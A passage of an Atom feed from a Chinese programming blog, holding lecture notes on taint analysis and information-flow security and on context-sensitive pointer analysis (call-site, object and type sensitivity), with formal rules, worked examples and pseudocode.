<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anemone&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://anemone.top/"/>
  <updated>2020-09-05T13:33:09.751Z</updated>
  <id>http://anemone.top/</id>
  
  <author>
    <name>Anemone</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>静态程序分析课程笔记（安全）</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E5%AE%89%E5%85%A8%EF%BC%89/"/>
    <id>http://anemone.top/pl-静态程序分析课程笔记（安全）/</id>
    <published>2020-09-05T13:22:13.000Z</published>
    <updated>2020-09-05T13:33:09.751Z</updated>
    
    <content type="html"><![CDATA[<p>在软件安全中，最常见的漏洞有注入类漏洞（Injection）和信息泄露（Information Leak），而本节课将介绍的Information Flow 分析方法可以有效处理以上漏洞，具体来说，就是我们常用的污点分析技术。</p><h1 id="Information-Flow-Security"><a href="#Information-Flow-Security" class="headerlink" title="Information Flow Security"></a>Information Flow Security</h1><a id="more"></a><h2 id="Information-Flow"><a href="#Information-Flow" class="headerlink" title="Information Flow"></a>Information Flow</h2><blockquote><p>Information flow: if the information in variable x is transferred to variable y, then there is information flow x → y. </p></blockquote><p>信息流[1] 指程序中的变量信息的流动，如有语句<code>y = x</code>，那么存在信息流 $x\rightarrow y$，可以看出，信息流分析很像先前的指针分析。</p><h2 id="Access-Control-v-s-Infomation-Flow-Security"><a href="#Access-Control-v-s-Infomation-Flow-Security" class="headerlink" title="Access Control v.s. Infomation Flow Security"></a>Access Control v.s. Infomation Flow Security</h2><ul><li><p>访问控制用于检查信息访问的权限，但是无法检查有权限的用户做什么</p></li><li><p>信息流安全用于检查程序处理数据的安全性，是端到端的信息安全</p></li></ul><p>实际系统中通常需要访问控制和信息流控制两者配合使用。</p><h2 id="Information-Flow-Security-1"><a href="#Information-Flow-Security-1" class="headerlink" title="Information Flow Security"></a>Information Flow Security</h2><p>信息流安全主要有两步骤：</p><ol><li>将变量划分为不同安全等级（Security Levels）</li><li>对不同等级的信息流做不同策略（Information Flow）</li></ol><h3 id="Security-Levels"><a href="#Security-Levels" class="headerlink" title="Security Levels"></a>Security Levels</h3><p>通常对信息流分为两级——高级（H）和低级（L），表示秘密和公开信息。</p><p>Dorothy 等人[2] 曾提出用格表示信息流，即 $L\leq H$</p><p>实际中也可以有更多级。</p><h3 id="Infomation-Flow-Policy"><a href="#Infomation-Flow-Policy" class="headerlink" title="Infomation Flow Policy"></a>Infomation Flow Policy</h3><p>高密级信息不能影响低密级信息，即高密级不能流向低密级，如下图所示：<br><img src="/pl-静态程序分析课程笔记（安全）/image-20200905193021433.png" alt="image-20200905193021433"></p><h1 id="Confidentiality-and-Integrity"><a href="#Confidentiality-and-Integrity" class="headerlink" title="Confidentiality and Integrity"></a>Confidentiality and Integrity</h1><p>保密性（Confidentiality）：阻止秘密信息被泄露，可以看出先前的策略就是保证了保密性，信息泄露类漏洞就是违反了保密性；</p><p>完整性（Integrity）：保证重要信息不被不可信信息污染，注入类漏洞就是违反了完整性。</p><p>下图可以看出Confidentiality和Integrity是对称的，可以视为信息的读安全和写安全：<br><img src="/pl-静态程序分析课程笔记（安全）/image-20200905194503470.png" alt="image-20200905194503470"></p><p>这也意味着，可以用相同的技术解决以上两类漏洞。</p><h1 id="Explicit-Flow-and-Convert-Channels"><a href="#Explicit-Flow-and-Convert-Channels" class="headerlink" title="Explicit Flow and Convert Channels"></a>Explicit Flow and Convert Channels</h1><p>显示流（Explicit Flow）指直接通过赋值传递信息的流，如：</p><ul><li><code>x = y</code></li><li><code>x = y + z</code></li></ul><p>隐秘信道（Convert Channels）[4]指通过控制流影响保密数据的信息流，例如如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">secret = getSecret();</span><br><span class="line"><span class="keyword">if</span> (secret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    publik = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    publik = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，根据 <code>publik</code> 数据可以推测 <code>secret</code> 正负。</p><p>通常来说，隐秘信道有以下表现形式</p><ul><li><p>隐式流（Implicit flows）</p><p><code>if (secret &lt; 0 ) p = 1; else p = 0;</code></p></li><li><p>终止信道（Termination channels）</p><p><code>while ( secret &lt; 0 ) {...};</code></p></li><li><p>时间信道（Timing channels）</p><p><code>if ( secret &lt; 0 ) for(...) {...};</code></p></li><li><p>异常（Exceptions）</p><p><code>if ( secret &lt; 0 ) throw new Exception(&quot;...&quot;);</code></p></li></ul><p>然而，隐藏信道泄露数据量较小，一般分析至针对显示流。</p><h1 id="Taint-Analysis"><a href="#Taint-Analysis" class="headerlink" title="Taint Analysis"></a>Taint Analysis</h1><p>污点分析将数据分为两类，被污染数据和未被污染数据。</p><ul><li>Source：污点传播源，污点数据常常是一些函数的返回值；</li><li>Sink：污点传播至关键点，也叫sink点，常常是敏感函数的参数。</li></ul><p>对于 Confidentiality，可以其做如下定义：</p><ul><li>Source：保密数据</li><li>Sink：泄露点</li></ul><p>对于 Integrity，可对其做如下定义：</p><ul><li>Source：不可信数据</li><li>Sink：敏感函数</li></ul><h2 id="Taint-and-Pointer-Analysis"><a href="#Taint-and-Pointer-Analysis" class="headerlink" title="Taint and Pointer Analysis"></a>Taint and Pointer Analysis</h2><p>污点分析与指针分析非常类似，将污点分析做如下调整，就可以借助指针分析做污点分析：</p><ul><li>将污点数据作为特殊objects</li><li>在allocation sites中产生source</li><li>借助指针分析完成污点分析</li></ul><p>以上下文不敏感的指针分析为例：</p><p>首先定义数据抽象：</p><p><img src="/pl-静态程序分析课程笔记（安全）/image-20200905202944738.png" alt="image-20200905202944738"></p><p>在数据抽象中加入污点数据（Taint Data），$T\subset O$</p><p>分析的输入为定义的 source 和 sink，输出为 TaintFlows，记为$<t_i, m> \in TaintFlows$， 表示污点 $t_i$ 传入了敏感函数 $m$ 中。</t_i,></p><p>在 call statments 中根据source产生污点 $t_l$：<br><img src="/pl-静态程序分析课程笔记（安全）/image-20200905204725605.png" alt="image-20200905204725605"></p><p>剩下的污点传播规则与指针分析一致：<br><img src="/pl-静态程序分析课程笔记（安全）/image-20200905204756009.png" alt="image-20200905204756009"></p><p>在call statements中检查污点是否传播到sink：<br><img src="/pl-静态程序分析课程笔记（安全）/image-20200905205129601.png" alt="image-20200905205129601"></p><p>下图举例说明了一个在指针分析的同时做污点分析的过程：</p><p><img src="/pl-静态程序分析课程笔记（安全）/image-20200905205353856.png" alt="image-20200905205353856"></p><p>注意，这里只介绍了最简单的污点分析，真实情况比样例复杂很多，当需要处理其他语句和方法，比如 Java 中字符串拼接方法<code>append()</code>，但是基本思路是不变的。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ol><li>Dorothy E. Denning and Peter J. Denning, “Certification of Programs for Secure Information Flow”. CACM 1977.</li><li>Dorothy E. Denning, “A Lattice Model of Secure Information Flow”. CACM 1976.</li><li>Ken Biba, “Integrity Considerations for Secure Computer Systems”. Technical Report, ESD-TR-76-372, USAF Electronic Systems Division, Bed-ford, MA, 1977.</li><li>Butler W. Lampson, “A Note on the Confinement Problem”. CACM 1973</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在软件安全中，最常见的漏洞有注入类漏洞（Injection）和信息泄露（Information Leak），而本节课将介绍的Information Flow 分析方法可以有效处理以上漏洞，具体来说，就是我们常用的污点分析技术。&lt;/p&gt;&lt;h1 id=&quot;Information-Flow-Security&quot;&gt;&lt;a href=&quot;#Information-Flow-Security&quot; class=&quot;headerlink&quot; title=&quot;Information Flow Security&quot;&gt;&lt;/a&gt;Information Flow Security&lt;/h1&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="白盒扫描" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="静态程序分析" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="污点分析" scheme="http://anemone.top/tags/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/"/>
    
      <category term="Information flow" scheme="http://anemone.top/tags/Information-flow/"/>
    
  </entry>
  
  <entry>
    <title>静态程序分析课程笔记（指针分析-上下文敏感）</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%95%8F%E6%84%9F%EF%BC%89/"/>
    <id>http://anemone.top/pl-静态程序分析课程笔记（指针分析-上下文敏感）/</id>
    <published>2020-08-30T13:22:13.000Z</published>
    <updated>2020-09-05T13:10:11.473Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><h2 id="Problem-of-Context-Insensitive-C-I"><a href="#Problem-of-Context-Insensitive-C-I" class="headerlink" title="Problem of Context-Insensitive (C.I.)"></a>Problem of Context-Insensitive (C.I.)</h2><ul><li>每次函数调用时，调用的上下文不一样；</li><li>在不同的调用上下文里，函数内的变量会指向不同；</li><li>在上下文不敏感的指针分析中，函数内的对象指向的内容是不同上下文混合起来的（如上例中 $n$ 指向 $o_1$ 和 $o_2$），而这些内容会后向传播，造成更多不准确的结果。</li></ul><a id="more"></a><p>具体如下图所示：</p><p><img src="/pl-静态程序分析课程笔记（指针分析-上下文敏感）/image-20200829210207900.png" alt="image-20200829210207900"></p><p>当分析到<code>int i = x.get()</code> 时，上下文不敏感指针分析会认为 $x$ 指向 $o_1,o_2$，因此做常量分析时，$i$ 的分析结果就是 NAC，这当然是不准确的。</p><h2 id="Context-Sensitivity-C-S"><a href="#Context-Sensitivity-C-S" class="headerlink" title="Context Sensitivity(C.S.)"></a>Context Sensitivity(C.S.)</h2><blockquote><p>Context sensitivity models calling contexts by distinguishing different data flows of different contexts to improve precision.</p></blockquote><p>上下文敏感模型会在调用时会区分不同上下文，以提升准确率。</p><p>上下文敏感分析需要对上下文抽象建模，目前最经典的策略是 <strong>call-site sensitivity</strong>，即上下文为调用点函数（调用点+被调函数）序列。</p><p><img src="/pl-静态程序分析课程笔记（指针分析-上下文敏感）/image-20200829221253965.png" alt="image-20200829221253965"></p><p>例如如上代码，<code>id()</code>函数存在两个上下文 <strong>[1]</strong> 和 <strong>[2]</strong>。</p><h2 id="Cloning-Based-Context-Sensitivity"><a href="#Cloning-Based-Context-Sensitivity" class="headerlink" title="Cloning-Based Context Sensitivity"></a>Cloning-Based Context Sensitivity</h2><p>为实现上下文敏感分析，最简单的方法是 <strong>cloning-based</strong>，即对于每一个函数，每到新的上下文就克隆一份新函数和其变量：</p><blockquote><p>In cloning-based context-sensitive pointer analysis, each method is qualified by one or more contexts.</p></blockquote><p>注意，对每个函数的克隆本质是对函数内变量的克隆，如下图所示：</p><p><img src="/pl-静态程序分析课程笔记（指针分析-上下文敏感）/image-20200830103742490.png" alt="image-20200830103742490"></p><p>对于<code>id()</code>函数内变量 <code>n</code> 来说，在第一行和第二行调用时，分别克隆出<code>[1]:n</code>和<code>[2]:n</code>个变量</p><h2 id="Context-Sensitive-Heap"><a href="#Context-Sensitive-Heap" class="headerlink" title="Context-Sensitive Heap"></a>Context-Sensitive Heap</h2><p>对于OO语言，不仅变量有上下文，对象实例也需要有上下文，即需要做堆抽象（对象存储在堆区）。</p><p>如下图，对<code>n</code>做上下文敏感分析：<br><img src="/pl-静态程序分析课程笔记（指针分析-上下文敏感）/Inkedimage-20200830104632305_LI.jpg" alt="image-20200830104632305"><br>在变量上下文敏感，堆不敏感时（左侧），在<code>newX(Number)</code>中x没有上下文，恒指向$o_8$，那么在第三行第四行调用时， $o_8.f$ 存在 $o_1, o_2$两种可能，因此n也有两种可能，分析结果不准确。</p><p>而堆敏感时（右侧），<code>newX(Number)</code>中存在上下文，即对于第三行第四行调用，产生不同上下文的x——$3:o_8$ 和$4:o_8$，它们分别指向$o_1$和$o_2$，因此n的分析时准确的。</p><p>注意，一般变量和堆敏感通常是同时使用的，缺一不可。</p><h1 id="Context-Sensitive-Pointer-Analysis-Rules"><a href="#Context-Sensitive-Pointer-Analysis-Rules" class="headerlink" title="Context Sensitive Pointer Analysis: Rules"></a>Context Sensitive Pointer Analysis: Rules</h1><h2 id="Domain"><a href="#Domain" class="headerlink" title="Domain"></a>Domain</h2><ul><li><p>上下文（Context）</p><script type="math/tex; mode=display">  c, c',c'' \in C</script><p>  C指所有上下文集合，根据不同的上下文抽象策略，c的表示内容不同，对于<strong>call-site sensitivity</strong>，而言，c为call-site的序列（callsite这里可用行号表示）；</p></li><li><p>上下文敏感方法（Context-sensitive methods）</p><script type="math/tex; mode=display">  c:m \in C \times M</script><p>  上下文方法表示为 $c:m$，属于 $C$ 和 $M$的笛卡尔积；</p></li><li><p>上下文敏感变量（Context-sensitive variables）</p><script type="math/tex; mode=display">  c:x, c':y \in C \times V</script><p>  与上下文方法类似，$c:x$ 表示在上下文 $c$ 下变量 $x$ 的指向；</p></li><li><p>上下文敏感对象（Context-sensitive methods）：</p><script type="math/tex; mode=display">  c:o_i, c':o_j \in C \times O</script></li><li><p>域（Fields）</p><script type="math/tex; mode=display">  f,g \in F</script><p>  因为域依附于对象，而对象实例存在上下文，因此域实际也存在了上下文；</p></li><li><p>对象实例域（Instance fields）</p><script type="math/tex; mode=display">c: o_{i} \cdot f, c^{\prime}: o_{j} \cdot g \in \mathrm{C} \times \mathrm{O} \times \mathrm{F}</script></li><li><p>上下文敏感指针（Context-sensitive pointers）</p><script type="math/tex; mode=display">CSPointer=(C\times V) \cup (C \times O \times F)</script><p>上下文敏感指针属于上下文变量和实例域的并集；</p></li><li><p>指向关系（Points-to relations）</p><script type="math/tex; mode=display">  pt: CSPointer \rightarrow\mathcal{P}(C\times O)</script></li></ul><h2 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h2><ul><li><p>New，<code>i: x = new T()</code>，</p><p>新建对象时， 上下文 $c$ 下 $o_i$ 加入$c:x$指针集中（发生在同一上下文中）；</p><script type="math/tex; mode=display">\frac{}{c:o_i \in pt(c:x)}</script></li><li><p>Assign, <code>x = y</code></p><script type="math/tex; mode=display">\frac{c':o_{i} \in pt(c:y)}{c':o_{i} \in pt(c:x)}</script><p>出现赋值后，让 $c:y$ 指向的内容 $c’:o_i$ 指向 $c:x$，注意$x$和$y$在同一上下文，而$o_i$在另一个上下文；</p></li><li><p>Store, <code>x.f = y</code></p><script type="math/tex; mode=display">\frac{c':o_i \in pt(c:x), c'':o_j \in pt(c:y)}{c'':o_j \in pt(c':o_i.f)}</script><p>赋值给域时，取上下文$y$的指向对象$c’’:o_j$，取上下文 $x$ 的指向对象$c’:o_i$，将$c’’:o_j$加入到$c’:o_i.f$的指向集合中；</p></li><li><p>Load, <code>y = x.f</code></p><script type="math/tex; mode=display">\frac{c':o_{i} \in pt(c:x), c'':o_{j} \in pt\left(c':o_{i} . f\right)}{c'':o_{j} \in pt(c:y)}</script><p>属性赋值给变量时，指向对于上下文 $x$ 指向的对象 $c’:o_i$ ，取出其域 $c’:o_i.f$ 指向的对象 $c’’:o_j$，将其加入到$c:y$。</p></li></ul><p>下图给出四种情况的形象表示：</p><p><img src="/pl-静态程序分析课程笔记（指针分析-上下文敏感）/image-20200830114749403.png" alt="image-20200830114749403"></p><p>Call语句，<code>l: r = x.k(a1,...,an)</code>：</p><script type="math/tex; mode=display">\frac{c^{\prime}: o_{i} \in p t(c: x) \\m=\text { Dispatch }\left(o_{i}, k\right), c^{t}=\operatorname{Select}\left(c, l, c^{\prime}: o_{i}\right) \\c^{\prime \prime}: o_{u} \in p t(c: a j), 1 \leq j \leq n \\c^{\prime \prime \prime}: o_{v} \in p t\left(c^{t}: m_{r e t}\right)}{c^{\prime}: o_{i} \in p t\left(c^{t}: m_{t h i s}\right) \\c^{\prime \prime}: o_{u} \in p t\left(c^{t}: m_{p j}\right), 1 \leq j \leq n \\c^{\prime \prime \prime}: o_{v} \in p t(c: r)}</script><ol><li><p>先对于$o_i,k$，解析其方法；</p></li><li><p>给定调用点上下文 $c$、调用点 $l$、x指向对象的上下文$c’:o_i$，通过$select()$，选择callee的上下文$c^t$（如下图所示，select选择出[2]和[3]上下文</p><p><img src="/pl-静态程序分析课程笔记（指针分析-上下文敏感）/image-20200830120358405.png" alt="image-20200830120358405"></p></li><li><p>传this，注意传到$c^t$上下文中——$c^{\prime}: o_{i} \in p t\left(c^{t}: m_{t h i s}\right)$；</p></li><li>传形参，传给$c^t$上下文的形参——$\frac{c^{\prime \prime}: o_{u} \in p t(c: a j), 1 \leq j \leq n }{c^{\prime \prime}: o_{u} \in p t\left(c^{t}: m_{p j}\right), 1 \leq j \leq n}$；</li><li>传返回值，将callee上下文的返回值传回caller上下文的变量$r$中——$\frac{c^{\prime \prime \prime}: o_{v} \in p t\left(c^{t}: m_{r e t}\right)}{c^{\prime \prime \prime}: o_{v} \in p t(c: r)}$</li></ol><p>可见：上下文敏感实际记录了函数调用栈（上下文），而上下文不敏感在进入callee后就无法知道caller的信息。</p><h1 id="Context-Sensitive-Pointer-Analysis：Algorithms"><a href="#Context-Sensitive-Pointer-Analysis：Algorithms" class="headerlink" title="Context Sensitive Pointer Analysis：Algorithms"></a>Context Sensitive Pointer Analysis：Algorithms</h1><h2 id="Pointer-Flow-Graph-with-C-S"><a href="#Pointer-Flow-Graph-with-C-S" class="headerlink" title="Pointer Flow Graph with C.S."></a>Pointer Flow Graph with C.S.</h2><p>上下文敏感的指针流图有如下定义：</p><ul><li><p>节点：$CSPointer = (C \times V) \cup (C \times O \times F)$</p><p>节点由上下文敏感的变量或是域组成</p></li><li><p>边：$CSPointer \times CSPointer$</p><p>边 $x \rightarrow y$ 指指针 $x$ 的指向信息同时被 $y$ 指向</p></li></ul><p>对于 New、Assign、Store和Load的加边策略：</p><p><img src="/pl-静态程序分析课程笔记（指针分析-上下文敏感）/image-20200830200755158.png" alt="image-20200830200755158"></p><p>new新建一个节点，不需要加边；assign添加 $c:x\leftarrow c:y$ 这一条边（上下文相同）；Store添加 $c’:o_i.f \leftarrow c:y$ 边，注意 $y$ 虽然和 $x$ 上下文相同，但是真正加边跨越了上下文（$y$ 和 $o_i.f$ 的上下文不同）；Load添加$c:y \leftarrow c’:o_i.f$ 边，与Store为反操作。</p><p>对于Call的加边策略：</p><p><img src="/pl-静态程序分析课程笔记（指针分析-上下文敏感）/image-20200830201313643.png" alt="image-20200830201313643"></p><p>添加实参新参的边，以及返回值的边（注意边跨越了caller和callee的上下文， $c$ 和 $c^t$），this 保证准确度仍使用指针值传递的方式，不加边。</p><h2 id="Algorithm-with-C-S"><a href="#Algorithm-with-C-S" class="headerlink" title="Algorithm with C.S."></a>Algorithm with C.S.</h2><p><img src="/pl-静态程序分析课程笔记（指针分析-上下文敏感）/image-20200830202712606.png" alt="image-20200830202712606"></p><p>算法如上图所示，黄色底为存在变化的区域，其中添加了对上下文的处理，而<code>Propagate()</code>，<code>AddEdge()</code>，<code>Dispathch()</code> 函数内容与先前相同。</p><p>算法输入仍为一个入口函数$m^{entry}$，输出为PFG和指向内容；</p><p>首先初始化，$S$ 表示可达语句集合，$S_m$表示函数m中的语句集合，$RM$表示<strong>上下文敏感</strong>的可达函数集合，CG表示<strong>上下文敏感</strong>的调用图，都初始化为空后，调用<code>AddReachable()</code>，注意初始情况上下文为空<code>[]</code>；</p><p><code>AddReachable()</code>处理new和assign语句，所有操作都在上下文 $c$ 中操作；</p><p>接着处理<code>worklist</code>，在处理store和load语句时，按先前图示添加边即可；</p><p>重点在于<code>ProcessCall()</code>，根据先前分析，首先用<code>Dispatch()</code>解析出调用的方法，接着通过<code>Select()</code>获取调用进callee的上下文 $c^t$，接下来的加入工作列表、加入可达函数集合的操作都在 $c^t$ 上下文中进行，最后按先前图示加入参数和返回值的边。</p><h1 id="Context-Sensitivity-Variants（Implementation-of-Select-）"><a href="#Context-Sensitivity-Variants（Implementation-of-Select-）" class="headerlink" title="Context Sensitivity Variants（Implementation of Select()）"></a>Context Sensitivity Variants（Implementation of <code>Select()</code>）</h1><p>对于上下文有不同的抽象表示，其中主要有 Call-site sensitivity，Object sensitivity 和 Type sensitivity。</p><h2 id="Call-Site-Sensitivity-k-CFA"><a href="#Call-Site-Sensitivity-k-CFA" class="headerlink" title="Call-Site Sensitivity(k-CFA)"></a>Call-Site Sensitivity(k-CFA)</h2><p>调用点敏感 [1]上下文由调用点行号和先前上下文组抽，即上下文本质上是调用栈的抽象：</p><script type="math/tex; mode=display">Select(\boldsymbol{c},\boldsymbol{l},\_)=[l',\dots,l'',l]\\\text{where }c=[l',\dots,l'']</script><p>上式表示了调用点敏感的<code>select()</code>函数的实现，即当前上下文 $c$ 的 $l$ 行发生了调用，那么调用进的上下文为$[c,l]$</p><p>但碰到递归调用时，上下文会无限的增加，此时需要视上下文为队列，并限制队列长度$k$（因此此方法也叫 k-CFA），实际应用时，$k \leq 3$，且函数上下文长度和堆上下文长度可以不一致，目前效果最好的是函数上下文长度为 $k=2$ 而堆上下文长度为 $k=1$。</p><p>那么特别的，</p><ul><li><p>1-call-site/CFA 可以表示为 $Select(c,l,_)=[l]$，注意到 $c$ 被丢弃</p></li><li><p>2-call-site/CFA 可以表示为</p><script type="math/tex; mode=display">  Select(c,l,_)=[l'',l]\\    where c=[l',l'']</script><p>  注意到第一个$l’$被丢弃。</p></li></ul><p>可以看出，$k$ 的值越长效果越准确，但是效率越低。</p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>如下图所示，蓝底代码为待分析代码，注意代码中没有store和load语句因此不需要看这两个语句的处理，并且不考虑heap sensitive：</p><p>初始化阶段，<strong>处理<code>main()</code>函数：</strong></p><p><img src="/pl-静态程序分析课程笔记（指针分析-上下文敏感）/image-20200902201538441.png" alt="image-20200902201538441" style="zoom:60%;"></p><p>将 $[]:C.main()$ 加入 RM 集合，因为函数存在new语句，将$\langle []:c, \{o_3\}\rangle$ 加入WL；</p><p>循环处理WL，<strong>处理$\langle []:c, \{o_3\}\rangle$</strong>：</p><ul><li>执行$Propagate()$，更新PFG</li><li>注意到语句中存在<code>c.m()</code>执行$ProcessCall([]:c,o_3)$<ul><li>$select()$给出$c^t=[4]$</li><li>传this，将$\langle [4]:m_{this}, \{o_3\}\rangle$ 加入 $WL$</li><li>CG中接入调用边 $[]:4\rightarrow[4]:C.m()$ </li><li>执行$AddReachable([4]:C.m())$<ul><li>$[4]:C.m()$加入$RM$</li><li>因为<code>m()</code>函数中存在new语句，将<code>n1</code>，<code>n2</code>加入WL</li></ul></li></ul></li></ul><p>处理结果如下：</p><ul><li><p>WL：$\left[\langle c^t:m_{this}, \{o_3\}\rangle, \left\langle[4]: n 1,\left\{o_{12}\right\}\right\rangle,\left\langle[4]: n 2,\left\{o_{13}\right\}\right\rangle\right]$</p></li><li><p>CG：$\{[]:4\rightarrow[4]:C.m()\}$</p></li><li><p>RM：$\{ []:C.main(), [4]:C.m()\}$</p></li><li><p>PFG：</p><pre class="mermaid">  graph LR_c("[]:c → {o3}")4_cm_this("[4]:C.m_this → {}")</pre></li></ul><p><strong>处理$\langle[4]:C.m_{this},\{o_3\}\rangle$：</strong></p><ul><li><p>执行$Propagate()$，更新PFG，$[4]:C.m_{this}$</p></li><li><p>注意到存在<code>x=this.id(n1)</code>，执行$ProcessCall([4]:C.m_{this}, o_3)$</p><ul><li>$select()$给出$c^t=[14]$</li></ul></li><li>添加$\langle [14]:m_{this}, \{o_3\}\rangle$至$WL$<ul><li>CG中接入调用边 $[4]:14\rightarrow[14]:C.id(Number)$ </li></ul></li><li><p>执行$AddReachable([]:C.m())$</p><ul><li>$[14]:C.id(Number)$加入$RM$</li><li>添加参数边至 $PFG$</li></ul></li><li><p>添加返回值边至 $PFG$</p></li><li><p>注意到存在<code>y=this.id(n2)</code>，执行$ProcessCall([4]:C.m_{this}, o_3)$，处理方式同上</p></li></ul><p>处理结果如下</p><ul><li><p>WL：$\left[ \left\langle[4]: n 1,\left\{o_{12}\right\}\right\rangle,\left\langle[4]: n 2,\left\{o_{13}\right\}\right\rangle, \langle [14]:m_{this}, \{o_3\}\rangle \right]$</p></li><li><p>CG：$\{[]:4\rightarrow[4]:C.m(), [4]:14\rightarrow[14]:C.id(Number), [4]:15\rightarrow[15]:C.id(Number)\}$</p></li><li><p>RM：$\{ []:C.main(), [4]:C.m(), [14]:C.id(Number), [15]:C.id(Number)\}$</p></li><li><p>PFG：</p><pre class="mermaid">  graph LR_c("[]:c → {o3}")4cm_this("[4]:C.m_this → {o3}")4_n1("[4]:n1 → {}") --> 14_n("[14]:n → {}")14_n-->4_x("[4]:x → {}")4_n2("[4]:n2 → {}") --> 15_n("[15]:n → {}")15_n-->4_y("[4]:y → {}")</pre></li></ul><p>后续分析较为简单，不再记录，最终结果为：</p><p><img src="/pl-静态程序分析课程笔记（指针分析-上下文敏感）/image-20200902212048049.png" alt="image-20200902212048049"></p><h2 id="Object-Sensitivity"><a href="#Object-Sensitivity" class="headerlink" title="Object Sensitivity"></a>Object Sensitivity</h2><p>对象敏感[2]的上下文由调用者对象和先前上下文组成：</p><script type="math/tex; mode=display">\begin{array}{c}\operatorname{Select}\left(\_,\_, \boldsymbol{c}^{\prime}: \boldsymbol{o}_{\boldsymbol{i}}\right)=\left[o_{j}, \ldots, o_{k}, o_{i}\right] \\\text { where } c^{\prime}=\left[o_{j}, \ldots, o_{k}\right]\end{array}</script><p>举例来说：</p><p><img src="/pl-静态程序分析课程笔记（指针分析-上下文敏感）/image-20200902213056427.png" alt="image-20200902213056427"></p><p>对于第5行代码调用后，1-object的上下文解析为$[o_1]$，可见对于第 7 行的指针分析而言，1-object效果优于1-call-site；</p><p>从调用图也可看出分别：</p><p><img src="/pl-静态程序分析课程笔记（指针分析-上下文敏感）/image-20200902213307436.png" alt="image-20200902213307436"></p><p>Object Sensitivity理论上并不优于Call Site，如先前例子Object弱于Call Site：</p><p><img src="/pl-静态程序分析课程笔记（指针分析-上下文敏感）/image-20200902213557030.png" alt="image-20200902213557030"></p><h2 id="Type-Sensitivity"><a href="#Type-Sensitivity" class="headerlink" title="Type Sensitivity"></a>Type Sensitivity</h2><p>类型敏感[3]的上下文由调用点类和先前上下文组成：</p><script type="math/tex; mode=display">\operatorname{Select}\left(\_, \_, \_, m\right)=\left[t^{\prime}, \ldots, t^{\prime \prime}, \operatorname{InType}\left(m\right)\right] \\\text{where }c^{\prime}=\left[t^{\prime}, \ldots, t^{\prime \prime}\right]</script><p>注意这里笔记改了一下老师的公式，这里 $Select()$ 的参数 $m$ 指caller，$InType()$ 为获取caller类名的函数。</p><p>举例来说：</p><p><img src="/pl-静态程序分析课程笔记（指针分析-上下文敏感）/image-20200903204348536.png" alt="image-20200903204348536"></p><p>对于第3、5、7行的调用，1-Type的结果为$[X]$——因为<code>main()</code>方法属于 <code>X</code> 类。不难看出，Type-sensitivity是 Object-sensistivity的再一次抽象，提高速度而降低了精度（效果&lt;=Object-sensitivity）。</p><h2 id="Experiment"><a href="#Experiment" class="headerlink" title="Experiment"></a>Experiment</h2><p>在李樾、谭添老师的论文[4]中，对比了三者的效率和精度，may-fail-cast 指强制转换出错的次数，精度越高出错次数会越少，call-graph-edge 指产生的调用图边数，精度越高边越少。</p><p><img src="/pl-静态程序分析课程笔记（指针分析-上下文敏感）/image-20200903205546848.png" alt="image-20200903205546848"></p><p>可以看出，从准确率角度，对象敏感最准确；从效率角度，类型敏感效率最高，而对于面向对象的 Java 语言，call-site效果最差。</p><p>顺带一提的是，论文[4]中介绍了一种新算法，因为程序分析在大多时候不需要上下文敏感，因此只在需要上下文敏感处使用准确的Object分析，就可以既保证精度又有足够的速度。</p><h1 id="Propagate-AddEdge-and-Dispatch"><a href="#Propagate-AddEdge-and-Dispatch" class="headerlink" title="Propagate(), AddEdge() and Dispatch()"></a>Propagate(), AddEdge() and Dispatch()</h1><p>Propagate():</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Propagate</span><span class="params">(n, pts)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    n: 指针n</span></span><br><span class="line"><span class="string">    pts: n可能指向的新的指针集合</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> pts <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">        pt(n) ⋃= pts <span class="comment"># 将pts内容存入到指针指向的集合中</span></span><br><span class="line">        <span class="keyword">for</span> each n → s ∈ PFG</span><br><span class="line">            add s, pts to WL</span><br></pre></td></tr></table></figure><p>AddEdge():</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 